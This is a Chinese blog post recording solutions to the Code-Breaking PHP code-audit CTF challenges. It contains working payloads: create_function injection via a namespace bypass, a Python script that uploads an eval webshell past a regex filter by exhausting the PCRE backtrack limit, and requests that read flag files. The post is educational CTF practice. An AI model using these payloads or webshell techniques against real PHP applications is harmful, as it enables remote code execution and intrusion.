@@ -1,0 +1,501 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>代码审计 Code-Breaking 做题记录 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="代码审计 Code-Breaking 做题记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-02-24 21:18" pubdate>
+        2019年2月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代码审计 Code-Breaking 做题记录</h1>
+            
+            <div class="markdown-body">
+              <p>好久没更新博客了，整理下之前的做题笔记</p>
+<a id="more"></a>
+
+<h2 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1. easy - function"></a>1. easy - function</h2><p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="hljs-variable">$action</span>)) &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这里考察的是<code>create_function</code>代码注入 </p>
+<p><code>PHP 7.2.13</code> 源码<br>路径 <code>php-7.2.13/Zend/zend_builtin_functions.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LAMBDA_TEMP_FUNCNAME	<span class="hljs-meta-string">&quot;__lambda_func&quot;</span></span><br><span class="hljs-comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span><br><span class="hljs-comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span><br>ZEND_FUNCTION(create_function)<br>&#123;<br>    zend_string *function_name;<br>	<span class="hljs-keyword">char</span> *eval_code, *function_args, *function_code;<br>	<span class="hljs-keyword">size_t</span> eval_code_length, function_args_len, function_code_len;<br>	<span class="hljs-keyword">int</span> retval;<br>	<span class="hljs-keyword">char</span> *eval_name;<br><br>	<span class="hljs-keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="hljs-string">&quot;ss&quot;</span>, &amp;function_args, &amp;function_args_len, &amp;function_code, &amp;function_code_len) == FAILURE) &#123;<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	eval_code = (<span class="hljs-keyword">char</span> *) emalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME)<br>			+function_args_len<br>			+<span class="hljs-number">2</span>	<span class="hljs-comment">/* for the args parentheses */</span><br>			+<span class="hljs-number">2</span>	<span class="hljs-comment">/* for the curly braces */</span><br>			+function_code_len);<br><br>	eval_code_length = <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME <span class="hljs-string">&quot;(&quot;</span>) - <span class="hljs-number">1</span>;<br>	<span class="hljs-built_in">memcpy</span>(eval_code, <span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME <span class="hljs-string">&quot;(&quot;</span>, eval_code_length);<br><br>	<span class="hljs-built_in">memcpy</span>(eval_code + eval_code_length, function_args, function_args_len);<br>	eval_code_length += function_args_len;<br><br>	eval_code[eval_code_length++] = <span class="hljs-string">&#x27;)&#x27;</span>;<br>	eval_code[eval_code_length++] = <span class="hljs-string">&#x27;&#123;&#x27;</span>;<br><br>	<span class="hljs-built_in">memcpy</span>(eval_code + eval_code_length, function_code, function_code_len);<br>	eval_code_length += function_code_len;<br><br>	eval_code[eval_code_length++] = <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>	eval_code[eval_code_length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>	eval_name = zend_make_compiled_string_description(<span class="hljs-string">&quot;runtime-created function&quot;</span>);<br>	retval = zend_eval_stringl(eval_code, eval_code_length, <span class="hljs-literal">NULL</span>, eval_name);<br>	efree(eval_code);<br>	efree(eval_name);<br><br>	<span class="hljs-keyword">if</span> (retval==SUCCESS) &#123;<br>		zend_op_array *func;<br>		HashTable *static_variables;<br><br>		func = zend_hash_str_find_ptr(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br>		<span class="hljs-keyword">if</span> (!func) &#123;<br>			zend_error_noreturn(E_CORE_ERROR, <span class="hljs-string">&quot;Unexpected inconsistency in create_function()&quot;</span>);<br>			RETURN_FALSE;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (func-&gt;refcount) &#123;<br>			(*func-&gt;refcount)++;<br>		&#125;<br>		static_variables = func-&gt;static_variables;<br>		func-&gt;static_variables = <span class="hljs-literal">NULL</span>;<br>		zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br>		func-&gt;static_variables = static_variables;<br><br>		function_name = zend_string_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;0lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="hljs-number">0</span>);<br>		ZSTR_VAL(function_name)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>		<span class="hljs-keyword">do</span> &#123;<br>			ZSTR_LEN(function_name) = <span class="hljs-built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="hljs-string">&quot;lambda_%d&quot;</span>, ++EG(lambda_count)) + <span class="hljs-number">1</span>;<br>		&#125; <span class="hljs-keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="hljs-literal">NULL</span>);<br>		RETURN_NEW_STR(function_name);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br>		RETURN_FALSE;<br>	&#125;<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br></code></pre></td></tr></table></figure>
+<p>从注释可知，用户传入的两个参数为<code>function_args</code>和<code>function_code</code></p>
+<p>跟进代码，可知后面会被拼接成一个完整的<code>php</code>函数,一段以<code>\0</code>结尾的字符串<code>eval_code: function __lambda_func (function_args)&#123;function_code&#125; \0</code><br>然后<code>eval_code</code>被传入<code>zend_eval_stringl()</code>执行。</p>
+<p>在本题中，<code>function_code</code>，也就是<code>$_GET[&#39;arg&#39;]</code>是可控的,我们可以构造<br><code>arg=return 0;&#125;phpinfo();//</code></p>
+<p>但是还有一个正则需要绕过,<code>$_GET[&#39;action&#39;]</code>的开头不能是<code>a-z</code>、<code>0-9</code>还有<code>_</code><br>因此直接传<code>create_function</code>是不行的。<br>这就涉及到了PHP的另一个知识点 <code>namespace</code><br>在PHP中，<code>\函数名a</code>,即调用全局的函数<code>a</code>。<br>因此我们可以传入<code>action=\create_function</code>来调用全局函数<code>create_function</code>。</p>
+<p>payload:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">action</span>=\create_function&amp;arg=return <span class="hljs-number">0</span><span class="hljs-comment">;&#125;phpinfo();//</span><br></code></pre></td></tr></table></figure>
+<p>成功执行代码<code>phpinfo()</code></p>
+<p><img src="https://image.mengsec.com/code-breaking/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>可知禁止执行以下函数</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>,shell_exec,passthru,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">popen</span>,proc_open,pcntl_exec,mail,<span class="hljs-keyword">putenv</span>,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log<br></code></pre></td></tr></table></figure>
+<p>列出当前目录文件。</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8087/index.php?action=\create_function&amp;arg=return 0;&#125;var_dump(scandir(&#x27;./&#x27;));//</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125; <br></code></pre></td></tr></table></figure>
+<p>列出上级目录文件。</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8087/index.php?action=\create_function&amp;arg=return 0;&#125;var_dump(scandir(&#x27;../&#x27;));//</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">31</span>) <span class="hljs-string">&quot;flag_h0w2execute_arb1trary_c0de&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; <br></code></pre></td></tr></table></figure>
+<p>读取flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">51.158.75.42:8087</span>/index.php?action=\create_function&amp;arg=return <span class="hljs-number">0</span>;&#125;var_dump(scandir(&#x27;../&#x27;));readfile(&#x27;../flag_h<span class="hljs-number">0</span>w<span class="hljs-number">2</span>execute_arb<span class="hljs-number">1</span>trary_c<span class="hljs-number">0</span>de&#x27;);//<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/code-breaking/2.png" srcset="/img/loading.gif" alt="2"></p>
+<h2 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2. easy - pcrewaf"></a>2. easy - pcrewaf</h2><p>直接给了源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可知通过程序通过正则过滤了php代码。</p>
+<p>参考链接<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<p>解题脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_GET[\&#x27;a\&#x27;]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br>print(res.headers)<br></code></pre></td></tr></table></figure>
+<p>找flag</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8088/data/4eb574ea10f554cfb8e5c501931ff030/1.php?a=var_dump(scandir(&#x27;../../../&#x27;));</span><br><br>回显<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">22</span>) <span class="hljs-string">&quot;flag_php7_2_1s_c0rrect&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; <br></code></pre></td></tr></table></figure>
+<p>读取flag</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8088/data/4eb574ea10f554cfb8e5c501931ff030/1.php?a=var_dump(scandir(&#x27;../../../&#x27;));readfile(&#x27;../../../flag_php7_2_1s_c0rrect&#x27;);</span><br>回显<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">22</span>) <span class="hljs-string">&quot;flag_php7_2_1s_c0rrect&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; flag&#123;<span class="hljs-number">216728</span>a834fb4c1e0bc6893e135f436e&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://image.mengsec.com/code-breaking/3.png" srcset="/img/loading.gif" alt="3"></p>
+<h2 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3. easy - phpmagic"></a>3. easy - phpmagic</h2><p>部分代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read-source&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br>define(<span class="hljs-string">&#x27;DATA_DIR&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/data/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]));<br><br><span class="hljs-keyword">if</span>(!is_dir(DATA_DIR)) &#123;<br>    mkdir(DATA_DIR, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>&#125;<br>chdir(DATA_DIR);<br><br><span class="hljs-variable">$domain</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;domain&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;domain&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$log_name</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;log&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;log&#x27;</span>] : date(<span class="hljs-string">&#x27;-Y-m-d&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>) &amp;&amp; <span class="hljs-variable">$domain</span>):<br>	<span class="hljs-variable">$command</span> = sprintf(<span class="hljs-string">&quot;dig -t A -q %s&quot;</span>, escapeshellarg(<span class="hljs-variable">$domain</span>));<br>    <span class="hljs-variable">$output</span> = shell_exec(<span class="hljs-variable">$command</span>);<br><br>    <span class="hljs-variable">$output</span> = htmlspecialchars(<span class="hljs-variable">$output</span>, ENT_HTML401 | ENT_QUOTES);<br><br>    <span class="hljs-variable">$log_name</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>] . <span class="hljs-variable">$log_name</span>;<br>    <span class="hljs-keyword">if</span>(!in_array(pathinfo(<span class="hljs-variable">$log_name</span>, PATHINFO_EXTENSION), [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;pht&#x27;</span>], <span class="hljs-literal">true</span>)) &#123;<br>        file_put_contents(<span class="hljs-variable">$log_name</span>, <span class="hljs-variable">$output</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><code>$domain</code> 可控。但是通过函数<code>escapeshellarg()</code>进行了处理，不能命令注入,但是经过<code>shell_exec()</code>之后，<code>$output</code>中一定包含<code>$domain</code>。</p>
+<p><code>$log_name </code>也是可控的，使用<code>pathinfo()</code>提取扩展名，限制的很全面，可以通过在路径末尾添加”/.”，可以使<code>pathinfo()</code>,获取不到扩展名，从而绕过黑名单检测。</p>
+<p><img src="https://image.mengsec.com/code-breaking/4.png" srcset="/img/loading.gif" alt="4"></p>
